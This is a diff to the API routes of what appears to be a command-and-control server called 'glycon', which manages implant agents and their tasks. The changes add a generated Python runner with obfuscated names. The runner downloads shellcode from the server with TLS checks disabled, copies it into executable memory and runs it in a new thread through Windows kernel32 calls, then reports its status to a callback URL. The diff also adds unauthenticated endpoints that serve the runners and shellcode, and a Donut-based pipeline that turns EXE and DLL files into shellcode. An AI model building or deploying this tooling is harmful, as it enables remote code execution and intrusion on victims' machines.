@@ -15,113 +15,104 @@ from glycon.secure_comms import SecureComms
 from glycon.config import CONFIG
 import traceback  # For detailed error reporting
 
+def _generate_runner_script(shellcode_url, callback_url=None):
+    """Generate the Python runner script that will download and execute shellcode and optionally send output back"""
+    callback_code = ""
+    if callback_url:
+        callback_code = f'''
+import json
+import requests
+def send_status(url, data):
+    try:
+        headers = {{'Content-Type': 'application/json'}}
+        requests.post(url, data=json.dumps(data), headers=headers, verify=False, timeout=5)
+    except Exception:
+        pass
+'''
+    return f"""import ctypes as mill
+import sys, requests as r
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+{callback_code}
+def mi(little):   
+    try:
+        bmx = r.get(little, verify=False).content
+    except r.exceptions.RequestException as e:
+        print(f"Error downloading file: {{e}}")
+        if '{callback_url}':
+            send_status('{callback_url}', {{'status': 'error', 'message': str(e)}})
+        return
+
+    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
+    mill.windll.kernel32.CreateThread.argtypes = (
+        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))
+
+    spc = mill.windll.kernel32.VirtualAlloc(
+        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
+    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
+    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
+    hndl = mill.windll.kernel32.CreateThread(
+        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
+        mill.pointer(mill.c_int(0)))
+
+    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
+    if '{callback_url}':
+        send_status('{callback_url}', {{'status': 'success', 'message': 'Shellcode executed'}})
+
+if __name__ == "__main__":
+    little = "{shellcode_url}"
+    mi(little)"""
 
 
 def init_api_routes(app, socketio):
-    @app.route('/api/task', methods=['POST'])
-    @login_required
-    def create_task():
+    @app.route('/api/shellcode_output', methods=['POST'])
+    def shellcode_output():
         try:
-            if request.content_type != 'application/json':
-                return jsonify({
-                    "status": "error", 
-                    "message": "Content-Type must be application/json"
-                }), 415
-
-            data = request.get_json()
-            if not data:
-                return jsonify({
-                    "status": "error", 
-                    "message": "No JSON data provided"
-                }), 400
+            if not request.is_json:
+                return jsonify({"status": "error", "message": "JSON data required"}), 400
             
-            # Handle raw shellcode tasks
-            if data.get('task_type') == 'shellcode' and data.get('task_data', {}).get('raw'):
-                shellcode_bytes = bytes(data['task_data']['shellcode'])
-                
-                # Store the raw shellcode with execution method
-                task_data = {
-                    'shellcode': base64.b64encode(shellcode_bytes).decode('utf-8'),
-                    'raw': True,
-                    'method': data['task_data'].get('method', 'direct')
-                }
-                
-                conn = sqlite3.connect(CONFIG.database)
-                c = conn.cursor()
-                
-                c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                        (None, 
-                        data['agent_id'], 
-                        'shellcode', 
-                        json.dumps(task_data),
-                        'pending', 
-                        datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
-                        None))
-                
-                conn.commit()
-                task_id = c.lastrowid
-                conn.close()
-                
-                socketio.emit('new_task', {
-                    'task_id': task_id,
-                    'agent_id': data['agent_id'],
-                    'task_type': 'shellcode'
-                })
-                
-                return jsonify({
-                    "status": "success", 
-                    "task_id": task_id
-                })
-
-            required_fields = ['agent_id', 'task_type']
-            if not all(field in data for field in required_fields):
-                return jsonify({
-                    "status": "error", 
-                    "message": f"Missing required fields: {required_fields}"
-                }), 400
+            data = request.get_json()
+            agent_id = data.get('agent_id')
+            status = data.get('status')
+            message = data.get('message')
+            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
+            
+            if not agent_id or not status:
+                return jsonify({"status": "error", "message": "agent_id and status required"}), 400
             
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
-            task_data = data.get('task_data', {})
+            # Ensure the shellcode_outputs table exists
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS shellcode_outputs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT NOT NULL,
+                    status TEXT NOT NULL,
+                    message TEXT,
+                    timestamp TEXT NOT NULL
+                )
+            ''')
             
-            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
-                    (None, 
-                    data['agent_id'], 
-                    data['task_type'], 
-                    json.dumps(task_data),
-                    'pending', 
-                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
-                    None))
+            c.execute('''INSERT INTO shellcode_outputs (agent_id, status, message, timestamp)
+                         VALUES (?, ?, ?, ?)''',
+                      (agent_id, status, message, timestamp))
             
             conn.commit()
-            task_id = c.lastrowid
-
-            if data['task_type'] == 'websocket':
-                ws_connected = 1 if data.get('action') == 'start' else 0
-                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
-                        (ws_connected, data['agent_id']))
-                conn.commit()
-            
             conn.close()
             
-            socketio.emit('new_task', {
-                'task_id': task_id,
-                'agent_id': data['agent_id'],
-                'task_type': data['task_type']
+            # Notify clients via websocket
+            socketio.emit('shellcode_output', {
+                'agent_id': agent_id,
+                'status': status,
+                'message': message,
+                'timestamp': timestamp
             })
             
-            return jsonify({
-                "status": "success", 
-                "task_id": task_id
-            })
-
+            return jsonify({"status": "success"})
         except Exception as e:
-            app.logger.error(f"Error creating task: {str(e)}")
-            return jsonify({
-                "status": "error", 
-                "message": str(e)
-            }), 500
+            app.logger.error(f"Error processing shellcode output: {str(e)}")
+            return jsonify({"status": "error", "message": str(e)}), 500
 
     @app.route('/api/checkin', methods=['POST'])
     def agent_checkin():
@@ -320,6 +311,76 @@ def init_api_routes(app, socketio):
         finally:
             if conn:
                 conn.close()
+
+
+
+    @app.route('/api/task', methods=['POST'])
+    @login_required
+    def create_task():
+        try:
+            if request.content_type != 'application/json':
+                return jsonify({
+                    "status": "error", 
+                    "message": "Content-Type must be application/json"
+                }), 415
+
+            data = request.get_json()
+            if not data:
+                return jsonify({
+                    "status": "error", 
+                    "message": "No JSON data provided"
+                }), 400
+            
+            required_fields = ['agent_id', 'task_type']
+            if not all(field in data for field in required_fields):
+                return jsonify({
+                    "status": "error", 
+                    "message": f"Missing required fields: {required_fields}"
+                }), 400
+            
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            task_data = data.get('task_data', {})
+            
+            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
+                    (None, 
+                    data['agent_id'], 
+                    data['task_type'], 
+                    json.dumps(task_data),
+                    'pending', 
+                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
+                    None))
+            
+            conn.commit()
+            task_id = c.lastrowid
+            
+            if data['task_type'] == 'websocket':
+                ws_connected = 1 if data.get('action') == 'start' else 0
+                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
+                        (ws_connected, data['agent_id']))
+                conn.commit()
+            
+            conn.close()
+            
+            socketio.emit('new_task', {
+                'task_id': task_id,
+                'agent_id': data['agent_id'],
+                'task_type': data['task_type']
+            })
+            
+            return jsonify({
+                "status": "success", 
+                "task_id": task_id
+            })
+
+        except Exception as e:
+            app.logger.error(f"Error creating task: {str(e)}")
+            return jsonify({
+                "status": "error", 
+                "message": str(e)
+            }), 500
+
 
     @app.route('/api/task_result', methods=['POST'])
     def task_result():
@@ -637,50 +698,42 @@ def init_api_routes(app, socketio):
     @login_required
     def generate_shellcode():
         try:
-            if 'file' not in request.files:
-                return jsonify({"status": "error", "message": "No file provided"}), 400
-                
-            file = request.files['file']
-            if file.filename == '':
-                return jsonify({"status": "error", "message": "No file selected"}), 400
-                
             entropy = request.form.get('entropy', '1')
             arch = request.form.get('arch', '64')
             args = request.form.get('args', '')
             agent_id = request.form.get('agent_id')
-            shellcode_type = request.form.get('shellcodeType', 'file')  # 'file' or 'raw'
-            raw_input_method = request.form.get('rawInputMethod', 'file')  # 'file' or 'text'
+            shellcode_type = request.form.get('shellcodeType', 'file')
+            raw_input_method = request.form.get('rawInputMethod', 'file')
             
             if not agent_id:
                 return jsonify({"status": "error", "message": "Agent ID required"}), 400
                 
             # Create temp directory
             temp_dir = tempfile.mkdtemp()
-            input_path = os.path.join(temp_dir, file.filename)
-            file.save(input_path)
-            app.logger.debug(f"Input path: {input_path}")
-            
             shellcode = None
             
             if shellcode_type == 'file':
-                # Handle PE file (EXE/DLL) - use Donut
+                if 'file' not in request.files:
+                    return jsonify({"status": "error", "message": "No file provided"}), 400
+                    
+                file = request.files['file']
+                if file.filename == '':
+                    return jsonify({"status": "error", "message": "No file selected"}), 400
+                
                 if not file.filename.lower().endswith(('.exe', '.dll')):
                     raise Exception("Only EXE and DLL files are supported for shellcode generation")
+                
+                input_path = os.path.join(temp_dir, file.filename)
+                file.save(input_path)
                 
                 # Generate unique output name
                 random_value = str(uuid.uuid4())[:8]
                 output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
                 output_path = os.path.join(temp_dir, output_name + '.bin')
-                app.logger.debug(f"Output path: {output_path}")
                 
                 # Build donut command
-                if args is None:
-                    args_str = ''
-                elif isinstance(args, list):
-                    args_str = ' '.join(f'"{arg}"' if ' ' in arg else arg for arg in args)
-                else:
-                    args_str = str(args)
-
+                args_str = str(args) if args else ''
+                
                 cmd = [
                     'docker', 'run', '--rm',
                     '-v', f"{temp_dir}:/workdir",
@@ -690,38 +743,40 @@ def init_api_routes(app, socketio):
                     '-o', f"/workdir/{output_name}.bin",
                     '-f', '1',
                     '-p', f'"{args_str}"',
-                    '-i', f"/workdir/{file.filename}",
-                    '-t'
+                    '-i', f"/workdir/{file.filename}"
                 ]
 
-                app.logger.debug(f"Docker Command: {' '.join(cmd)}") 
-                # Run donut
-                result = subprocess.run(cmd, capture_output=True, text=True)
-                if result.returncode != 0:
-                    raise Exception(f"Donut failed: {result.stderr}")
-                
-                if not os.path.exists(output_path):
-                    raise Exception("Shellcode file was not generated")
-                
-                with open(output_path, 'rb') as f:
-                    shellcode = f.read()
-                
-                # Clean up output file
-                os.remove(output_path)
-                
+                # Run donut and properly handle the response
+                try:
+                    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+                    if result.returncode != 0:
+                        raise Exception(f"Donut failed: {result.stderr}")
+                    
+                    if not os.path.exists(output_path):
+                        raise Exception("Shellcode file was not generated")
+                    
+                    with open(output_path, 'rb') as f:
+                        shellcode = f.read()
+                except subprocess.CalledProcessError as e:
+                    raise Exception(f"Donut execution failed: {e.stderr}")
             else:
                 # Handle raw shellcode input
                 if raw_input_method == 'file':
-                    # Read raw binary file
+                    if 'file' not in request.files:
+                        return jsonify({"status": "error", "message": "No file provided"}), 400
+                        
+                    file = request.files['file']
+                    if file.filename == '':
+                        return jsonify({"status": "error", "message": "No file selected"}), 400
+                    
+                    input_path = os.path.join(temp_dir, file.filename)
+                    file.save(input_path)
                     with open(input_path, 'rb') as f:
                         shellcode = f.read()
                 else:
-                    # Handle hex input from textarea
                     hex_string = request.form.get('shellcodeHex', '').strip()
                     if not hex_string:
                         raise Exception("No hex shellcode provided")
-                    
-                    # Convert hex string to bytes
                     try:
                         shellcode = bytes.fromhex(hex_string)
                     except ValueError as e:
@@ -730,14 +785,51 @@ def init_api_routes(app, socketio):
             if not shellcode:
                 raise Exception("No shellcode was generated or provided")
             
+            # Generate random filename for shellcode
+            shellcode_name = f"shellcode_{uuid.uuid4().hex[:8]}.bin"
+            shellcode_dir = os.path.join(app.root_path, 'shellcodes')
+            os.makedirs(shellcode_dir, exist_ok=True)
+            shellcode_path = os.path.join(shellcode_dir, shellcode_name)
+            
+            # Save shellcode to file
+            with open(shellcode_path, 'wb') as f:
+                f.write(shellcode)
+            
+            # Generate shellcode URL
+            shellcode_url = f"{request.url_root}api/download_shellcode/{shellcode_name}"
+            
+            # Generate runner script
+            runner_content = _generate_runner_script(shellcode_url)
+            runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
+            runners_dir = os.path.join(app.root_path, 'runners')
+            os.makedirs(runners_dir, exist_ok=True)
+            runner_path = os.path.join(runners_dir, runner_name)
+            
+            with open(runner_path, 'w') as f:
+                f.write(runner_content)
+                
+            runner_url = f"{request.url_root}api/download_runner/{runner_name}"
+            
             # Create task for agent
             conn = sqlite3.connect(CONFIG.database)
             c = conn.cursor()
             
+            # First check if identical task already exists
+            c.execute("""SELECT id FROM tasks 
+                        WHERE agent_id=? AND task_type='shellcode' AND status='pending'
+                        ORDER BY created_at DESC LIMIT 1""",
+                    (agent_id,))
+            existing_task = c.fetchone()
+            
+            if existing_task:
+                return jsonify({
+                    "status": "error",
+                    "message": "A pending shellcode task already exists for this agent"
+                }), 400
+
             task_data = {
-                'shellcode': base64.b64encode(shellcode).decode('utf-8'),
-                'raw': shellcode_type == 'raw',  # Mark as raw if not using Donut
-                'method': 'direct'
+                'runner_url': runner_url,
+                'execution_method': 'download_execute'
             }
             
             c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
@@ -753,23 +845,22 @@ def init_api_routes(app, socketio):
             
             # Clean up temp files
             try:
-                if os.path.exists(input_path):
+                if 'input_path' in locals() and os.path.exists(input_path):
                     os.remove(input_path)
-                os.rmdir(temp_dir)
+                if 'output_path' in locals() and os.path.exists(output_path):
+                    os.remove(output_path)
+                if os.path.exists(temp_dir):
+                    os.rmdir(temp_dir)
             except Exception as e:
                 app.logger.error(f"Error cleaning up temp files: {str(e)}")
             
-            # Notify agent
-            socketio.emit('new_task', {
-                'task_id': task_id,
-                'agent_id': agent_id,
-                'task_type': 'shellcode'
-            })
+        
             
             return jsonify({
                 "status": "success",
                 "task_id": task_id,
-                "message": "Shellcode generated and task created"
+                "message": "Shellcode generated and task created",
+                "runner_url": runner_url
             })
             
         except Exception as e:
@@ -788,7 +879,7 @@ def init_api_routes(app, socketio):
                 "status": "error",
                 "message": str(e)
             }), 500
-        
+
 
     @app.route('/api/kill_agent', methods=['POST'])
     @login_required
@@ -1032,3 +1123,25 @@ def init_api_routes(app, socketio):
         finally:
             if conn:
                 conn.close()
+
+    
+
+    @app.route('/api/download_runner/<string:runner_name>')
+    def download_runner(runner_name):
+        runners_dir = os.path.join(app.root_path, 'runners')
+        runner_path = os.path.join(runners_dir, runner_name)
+        
+        if not os.path.exists(runner_path):
+            return jsonify({"status": "error", "message": "Runner not found"}), 404
+        
+        return send_from_directory(runners_dir, runner_name, as_attachment=True)
+    
+    @app.route('/api/download_shellcode/<string:shellcode_name>')
+    def download_shellcode(shellcode_name):
+        shellcode_dir = os.path.join(app.root_path, 'shellcodes')
+        shellcode_path = os.path.join(shellcode_dir, shellcode_name)
+        
+        if not os.path.exists(shellcode_path):
+            return jsonify({"status": "error", "message": "Shellcode not found"}), 404
+        
+        return send_from_directory(shellcode_dir, shellcode_name, as_attachment=True)
